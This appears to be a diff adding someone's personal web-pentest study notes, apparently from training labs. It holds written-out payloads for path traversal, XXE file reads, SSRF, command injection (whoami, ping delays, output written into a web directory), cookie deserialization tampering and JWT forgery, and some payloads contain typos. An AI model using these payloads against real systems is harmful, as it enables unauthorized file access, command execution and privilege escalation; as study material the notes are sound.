@@ -1,0 +1,146 @@
+
+ 1-) recon:
+	sublister : subdomain enum 
+	ffuf : directory enum
+	gobuster : directory and files enum because we can specify ext with -x flag
+
+ 2-) URL testing and source code enum
+
+ 3-) IDOR & Logic error (Broken Access Control):
+	creating two accounts and try to replace userID
+	try change admin value to true while submite your account 	
+	change your cookie with admin cookie or userID with 0
+	change the id of somthing you buy
+
+ 4-) SQL Injection
+
+ 5-) Directory Traversals:
+	../../etc/passwd
+	....//....//etc/passwd
+	we can put the "." and "/" in an encoded way
+	not just in url! try it any where
+	usually in get requests in the line number one of burp 
+	try it in any image loading in the website
+	any file is loading on the website can work
+	tool called dotdotpwn to automate : $dotdotpwn -m http -h <page url>
+
+ 6-) XML external entity (XXE) injection:
+	it happen in any xml request, and the two codes below is exmple for before and after injection...
+	------------------------------------------------------------
+	<?xml version="1.0" encoding="UTF-8"?>
+	<stocklevel><ProductID>215</productID></stocklevel>
+	------------------------------------------------------------
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+	<stocklevel><ProductID>&xxe;</ProductID></stocklevel>
+	------------------------------------------------------------
+	
+	we can find xml code in any packet
+	somtimes the xml code encrypted, in that case they should give the code to a parameter like : data=<encrpted xml>
+	we can decrypte the data manully or by clicking inspection on the right of repeater and modify it 
+	if the website accept uploading a file we can write our injected xml code in that file
+	we can put "&xxe;" anywhere has <> </>
+	we can use php rappers after we found xxe injection and modify the code to look like this:
+	------------------------------------------------------------
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "fiphp://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
+	<stocklevel><ProductID>&xxe;</ProductID></stocklevel>
+	------------------------------------------------------------
+	then decode it
+
+ 7-) XSS
+
+ 
+ 8-) server side request forgery SSRF:
+	manipulate the URL to let the server give us information, just the url not any request ok
+	first we write our ip in the url and make the server connect back to us while openning nc on port 80
+	if the connection success then maybe we have SSRF
+	second we write 127.0.0.1 or website ip instade of our ip and we request file on the server
+	in another words when i saw somthing like below i should immediatly try SSRF:
+		"http://somthing.com/admin?url=anything"
+		"http://somthing.com/admin?url=file:///etc/passwd"       if linux
+		"http://somthing.com/admin?url=http://<server ip>/etc/passwd"       if linux
+		"http://somthing.com/admin?url=http://<my IP>"           for windows
+ 
+	if there is a request to the server we can replace it with our payload like this:
+		stockApi=http%asdasjfbsajkfasjabsasdasasddd
+		stockApi=http://127.0.0.1/admin
+	or we can eaisly try it with & instade of remove it all:
+		stockApi=http%asdasjfbsajkfasjabsasdasdd&stockApi=http://127.0.0.1/admin
+
+	another thing we might try is to put url or urls parameter with & to the get request:
+		Get /product?productId=5 HTTP/1.1
+		Get /product?productId=5&url=127.0.0.1 HTTP/1.1
+
+	if 127.0.0.1 doesnt work we may try server ip or even its name
+
+ 9-) command injection:
+	simply add any command to the request and see if the server will responde to it
+	we find it in any requet even in the singUp or feedback requsets 
+	we find it at the bottm in burp an example is the following :
+		productId=5
+		productId=5&whoami
+		productId=5&&whoami
+	another example:
+		productId=5&storeId=5
+		productId=5|whoami&storeId=5
+		productId=5|whoami|&storeId=5
+		productId=5|whoami||&storeId=5
+		productId=5||whoami||&storeId=5
+		productId=5&storeId=5|id
+		productId=23558664434|whoami&storeId=5
+		and so on we try everything we think of...........
+
+	we could counter a time delay espisially in feedback requests so we can try ping with delay like this:
+		csrf=kjasdkjsabd&name=asdas&email=asd@asd.asd&message=asd
+		csrf=kjasdkjsabd&name=asdas|ping+-c+10+127.0.0.1&email=asd@asd.asd&message=asd
+		csrf=kjasdkjsabd&name=asdas|ping+-c+10+127.0.0.1|&email=asd@asd.asd&message=asd
+		csrf=kjasdkjsabd&name=asdas||ping+-c+10+127.0.0.1||&email=asd@asd.asd&message=asd
+
+	after we try with every parameter and find the injected one we should face delay in the request for 10 seconds
+	after that we could try to upload a command and save it in a directory we could reach
+	an example for that is usually they put images in a directory like /var/www/images:
+		csrf=kjasdkjsabd&name=asdas|whoami>/var/www/images/file.txtwq||&email=asd@asd.asd&message=asd
+	then we go to any image and open it in a new tap and replace its name with file.txt
+
+
+ 10-) file upload
+
+ 11-) Insecure Deserialization:
+	manipulate the cookie or sessionId
+	first we should try login with any user account and intercept the login request with burp 
+	then look for cookie and decode it in the repeater with inspector
+	then we should replace the bolean parameter to true or 1
+	then use cookie editor to replace our cookie with the modified one
+	it should look like somthing like this:
+		cookie: session=ouhdasuidiasudgiusadkosadnjsadhbihsadbsaikjdnashdvsauygkmlkm
+		cookie: session=O:4:"User":2:{s:8:"username";s:6:"abood";s:5:"admin";b:0;}       ...after decode it
+		cookie: session=O:4:"User":2:{s:8:"username";s:6:"abood";s:5:"admin";b:1;}	 ...after modify it
+	
+	another example:
+		cookie: session=ouhdasuidiasudgiusadkosadnjsadhbihsadbsaikjdnashdvsauygkmlkm
+		cookie: session=O:4:"User":2:{s:8:"username";s:6:"abood";s:12:"access_token";s:32;"hkabsdkbasd6asd5asdad";}
+		cookie: session=O:4:"User":2:{s:8:"username";s:6:"abood";s:12:"access_token";b:1;}
+	or we can replace b:1 with i:0 (int value 0), and dont put " for the b or the i 
+
+ 12-) json web token (JWT):
+	so when i found a json page and you will know it when you see it we could try somthing like this:
+		curl -POST http://<server ip>:<port number>/login -d "username=admin&password=password";
+	if we found a legitmet username and a password we will have a token in return
+	then we should try open the json page without the /login and intercept the request with burp
+	then append the following any where to the request:
+		...
+		...
+		Authorization: Barer
+		<here we put our token>
+		...
+		...
+	 if that worked we can try to get information with it :
+		GET /Users HTTP/1.1
+		GET /Users/<username> HTTP/1.1
+
+	sometimes the token is in the request and we should just manipulate it like change the name to admin for example
+	and we can try to put none to the algorithem the token used and make any changes in clear text
+
+
+    
